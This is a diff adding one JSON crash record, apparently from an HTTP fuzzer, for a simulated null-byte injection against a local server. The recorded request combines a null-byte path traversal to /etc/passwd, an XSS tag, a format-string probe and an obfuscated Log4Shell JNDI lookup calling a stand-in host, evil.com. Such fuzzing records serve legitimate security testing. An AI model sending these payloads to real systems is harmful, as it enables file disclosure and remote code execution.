@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:42:14.753771",
+  "crash_type": "null_byte_injection",
+  "payload": "PATCH /.\u0000.//.\u0000.//.\u0000.//etc/passwd?\nHeaders: {'User-Agent': '<script>alert(1)</script>', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Rewrite-Url': '%p%p%p%p%p%p%p%p%p%p', 'Referer': '../../../etc/passwd', 'Content-Length': '49'}\nBody: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
+  "payload_hash": "da087d76b0741726",
+  "request_method": "PATCH",
+  "request_path": "/.\u0000.//.\u0000.//.\u0000.//etc/passwd?",
+  "request_headers": {
+    "User-Agent": "<script>alert(1)</script>",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Rewrite-Url": "%p%p%p%p%p%p%p%p%p%p",
+    "Referer": "../../../etc/passwd",
+    "Content-Length": "49"
+  },
+  "request_body": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
+  "error_message": "Simulated null_byte_injection",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 333
+}
